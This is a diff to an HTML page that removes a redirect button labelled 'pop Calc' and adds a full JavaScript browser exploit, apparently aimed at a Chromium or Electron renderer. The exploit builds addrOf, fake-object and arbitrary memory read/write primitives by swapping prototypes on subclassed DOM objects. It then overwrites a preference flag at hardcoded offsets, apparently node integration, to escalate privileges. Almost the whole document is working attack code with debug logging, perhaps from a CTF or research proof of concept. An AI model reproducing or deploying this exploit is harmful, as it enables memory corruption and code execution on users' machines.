@@ -1,12 +1,299 @@
-<html>
-<head>
-</head>
 <script>
-        function clickfunc(){
-                top.location.href = "https://notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F5b3c7af0-f419-42c3-add3-f8e69a1b3c96%2Ftest.html?table=block&id=8870f2a4-5eb3-491a-a3c7-504e3d9b1030&spaceId=6e66d9f1-e582-4c9f-99fc-b7608ce26c6f&name=test.html&cache=v2"
-                }
+
+    var loopCount = 0x10;
+    var view = new ArrayBuffer(24);
+    var dblArr = new Float64Array(view);
+    var intView = new Int32Array(view);
+    var bigIntView = new BigInt64Array(view);
+    var flArr = new Float32Array(view);
+    let www_double = new Float64Array(1);
+
+
+    var decoderBufferOffset = 0x8;
+
+    function f32toi(f) {
+      flArr[0] = f;
+      return intView[0];
+    }
+    function itof32(i) {
+      intView[0] = i;
+      return flArr[0];
+    }
+
+    function ftoi32(f) {
+      dblArr[0] = f;
+      return [intView[0], intView[1]];
+    }
+
+    function i32tof(i1, i2) {
+      intView[0] = i1;
+      intView[1] = i2;
+      return dblArr[0];
+    }
+    function i32toi(i_lo, i_hi) {
+      intView[0] = i_lo;
+      intView[1] = i_hi;
+      return bigIntView[0];
+    }
+    var buf=new ArrayBuffer(8);
+var f64_buf=new Float64Array(buf);
+var u64_buf=new Uint32Array(buf);
+
+function ftoi(val){
+        f64_buf[0]=val;
+        return (BigInt(u64_buf[0])+(BigInt(u64_buf[1])<<32n));
+}
+
+function itof(val){
+        u64_buf[0]=Number(val&0xffffffffn);
+        u64_buf[1]=Number(val>>32n);
+        return (f64_buf[0]);
+}
+ 
+
+    class SubMatrix extends DOMMatrix {
+      constructor(addr) {
+        let input = matrixInput;
+        input[11] = itof(BigInt(addr - 0x18));
+        super(input);
+      }
+
+      readContent() {
+        return super.interval;
+      }
+    }
+    // should to modify 
+       class Fakeobj extends Touch {
+      constructor(addr) {
+        var z = new EventTarget()
+        var option = {
+        identifier: 0x123456789abc,
+        radiusY: itof32(Number(addr&0xffffffffn)),
+        rotationAngle: itof32(Number(addr>>32n)),
+        target: z,
+        }
+        super(option);
+      }
+        
+      getFakeObj() {
+        return super.signal;
+      }
+    }
+
+    var height = 4;
+    var width = 3;
+
+    class SubImg extends ImageData {
+      constructor(imgData) {
+        super(imgData, height,width);
+      }
+        
+      getAddr() {
+        return super.m21;
+      }
+    }
+
+    
+
+    //matrix memory layout: m12 = matrix_[0][1], m21 = matrix_[1][0] ... double arrays
+    var matrixInput = [11,12,13,14,21,22,23,24,31,32,33,34,41,42,43,44];
+
+    var domMatrixImg = new DOMMatrix(matrixInput);
+
+
+    var req = new Request({});
+      
+
+    var motionEvent = new DeviceMotionEvent({});
+
+    function leakImageAddr(i) {
+      domMatrixImg['a' + i] = 1;
+      if (i < loopCount) {
+        SubImg.prototype.__proto__ = {};
+      } else {
+        SubImg.prototype.__proto__ = domMatrixImg;
+      }
+      domMatrixImg.m21;
+      let addr = img.getAddr();
+      return Number(ftoi(addr));
+    }
+
+    function readFrom(i, subMatrix) {
+      motionEvent['a' + i] = 1;
+      if (i < loopCount) {
+        SubMatrix.prototype.__proto__ = {};
+      } else {
+        SubMatrix.prototype.__proto__ = motionEvent;
+      }
+      motionEvent.interval;
+      let addr = subMatrix.readContent();
+      return addr;
+    }
+
+
+     function createFakeObj(i, addr) {
+      req['a' + i] = 1;
+      if (i < loopCount) {
+        Fakeobj.prototype.__proto__ = {};
+      } else {
+        Fakeobj.prototype.__proto__ = req;
+      }
+      req.signal;
+      return fakeobj.getFakeObj();
+    }
+
+    function addrOf(obj) {
+      objArr[0] = obj;
+      return ftoi32(fakeDblArr[5])[0];
+    }
+
+
+    function compressedRead(addr) {
+      doubleArr[1] = i32tof(addr - 0x8, 0x1000);
+      let out = fakeDblArr[0];
+      doubleArr[1] = doubleArrDefault;
+      return out;
+    }
+
+    function compressedWrite(addr, value) {
+      doubleArr[1] = i32tof(addr - 0x8, 0x1000);
+      fakeDblArr[0] = value;
+      doubleArr[1] = doubleArrDefault;
+    }
+      function fullRead(addr) {
+      addr = addr;
+      var high = ((addr >> 32n) & 0xffffffffn);
+      var low = addr & 0xffffffffn
+      compressedWrite(full_addr+0x28,itof((high<<32n) + (low)));
+      let out = ftoi(www_double[0]);
+      compressedWrite(full_addr+0x28,itof(BigInt(original)));
+      return out;
+    }
+       function fullWrite(addr,value) {
+      addr = addr;
+      var high = ((addr >> 32n) & 0xffffffffn);
+      var low = addr & 0xffffffffn
+      compressedWrite(full_addr+0x28,itof((high<<32n) + (low)));
+      www_double[0] = itof(value);
+      compressedWrite(full_addr+0x28,itof(BigInt(original)));
+
+    }
+
+    var imgDataStore = new ArrayBuffer(48);
+    var imgData = new Uint8ClampedArray(imgDataStore);
+    var doubleArr = [1.1, 2.2, 3.3, 4.4, 5.5];
+    var objArr = [imgData];
+
+    var img = new SubImg(imgData);
+
+    for (let i = 0; i < loopCount; i++) {
+      leakImageAddr(i);
+    }
+
+    let imgAddr = leakImageAddr(loopCount);
+    console.log(imgAddr);
+    let mainWorldMatrix = new SubMatrix(imgAddr + 0x8);
+
+    for (let i = 0; i <= loopCount-1; i++) {
+      readFrom(i, mainWorldMatrix);
+    }
+    
+    let mainWorldWrapper = Number(ftoi(readFrom(loopCount, mainWorldMatrix)));
+
+    let wrapperMatrix = new SubMatrix(imgAddr);
+
+    let wrapperAddr = ftoi(readFrom(loopCount, wrapperMatrix));
+
+    let v8AddrMatrix = new SubMatrix(mainWorldWrapper);
+
+    let v8TypedArrayAddr = Number(ftoi(readFrom(loopCount, v8AddrMatrix)));
+
+    let doubleArrMatrix = new SubMatrix(v8TypedArrayAddr + 0x74 - 1);
+    let doubleMap = ftoi32(readFrom(loopCount, doubleArrMatrix))[1];
+
+    let fakeWrapper64View = new BigInt64Array(imgDataStore);
+    fakeWrapper64View[0] = BigInt(v8TypedArrayAddr + 0x50);
+
+    var doubleArrElementDefault = (v8TypedArrayAddr + 0x60) >> 0;
+    var doubleArrDefault = i32tof(doubleArrElementDefault, 0x1000);
+    //map + properties
+    doubleArr[0] = i32tof(doubleMap, 0x0800222d);
+    //elements + length
+    doubleArr[1] = doubleArrDefault;
+    doubleArr[2] = i32tof(0x0800222d, 0x1000);
+    doubleArr[3] = 1.1;
+    var fakeobj = new Fakeobj(BigInt(imgAddr + 0x8));
+
+    for (let i = 0; i < loopCount; i++) {
+      createFakeObj(i);
+    }
+        var fakeDblArr = createFakeObj(loopCount);
+     console.log(mainWorldWrapper.toString(16));
+    console.log(wrapperAddr.toString(16));
+    console.log(v8TypedArrayAddr.toString(16));
+    for (let i = 0; i < loopCount; i++) {
+      createFakeObj(i);
+    }
+
+    var fakeDblArr = createFakeObj(loopCount);
+    console.log("window : "+addrOf(window));
+    var addr1 = ftoi(compressedRead(addrOf(window)+0x18));
+    console.log("addr1 : "+addr1.toString(16));
+    var full_addr = addrOf(www_double);
+    console.log("full_addr : "+full_addr.toString(16));
+    var original = ftoi(compressedRead(full_addr+0x28));    
+    console.log("original : "+original.toString(16));
+
+    var addr2 = fullRead(BigInt(addr1)+0x120n);
+    console.log("addr2 : "+addr2.toString(16));
+    //var defont = addr2 + 0x000000000004c230n;
+    var defont = addr2 + 0x000000000004b210n;
+    // 0x000000000005bde8
+    var defont_val = fullRead(defont);
+    console.log("defont_addr : "+defont.toString(16));
+    console.log("defont_val : "+defont_val.toString(16));
+     // var web_pref = addr2 + 0x001e64a0n;
+    var nisf = defont + 0x00000000000000e1n;
+    var nisf_val = fullRead(nisf);
+    console.log("nisf_addr : "+nisf.toString(16));
+    console.log("nisf_val : "+nisf_val.toString(16));
+    var overwrite = nisf_val | 0x0000000000010001n
+    fullWrite(nisf,overwrite);
+    var nisf_val = fullRead(nisf);
+    console.log("overwrite nisf_val : "+nisf_val.toString(16));
+
+    // var ni = defont + 0x00000000000000e1n;
+    // var ni_val = fullRead(ni);
+    // console.log("ni_addr : "+ni.toString(16));
+    // console.log("ni_val : "+ni_val.toString(16));
+    // var overwrite = ni_val | 0x0000000000000001n
+    // fullWrite(ni,overwrite);
+    // var ni_val = fullRead(ni);
+    // console.log("overwrite ni_val : "+ni_val.toString(16));
+    // var web_pref = addr2 + 0x50008n
+    // var nisf = web_pref + 0x1acn
+    // var nisf_val = fullRead(nisf);
+    // console.log("nisf_val : "+nisf_val);
+    // var nisf_val = nisf_val | 0x0000000000000001n
+    // fullWrite(nisf,nisf_val);
+    // var nisf_val = fullRead(nisf);
+    // console.log("nisf_val : "+nisf_val);
+    
+    
+    
+    
+   
+   
+    
+        //console.log(typeof(fakeDblArr));
+        //////// 위까지 fake Array        
+        // var win_arr = addrOf(window);
+        // console.log('window: '+win_arr);
+        // var arr1 = ftoi32(compressedRead(win_arr+0x18))[0];
+        // console.log('arr1: '+arr1);
+        // var arr2 = fullRead(Number(arr1+0xf8n));
+        // console.log('arr2: '+arr2);
+
+
+
 </script>
-<body>
-        <button onclick="clickfunc()">pop Calc</button>
-</body>
-</html>
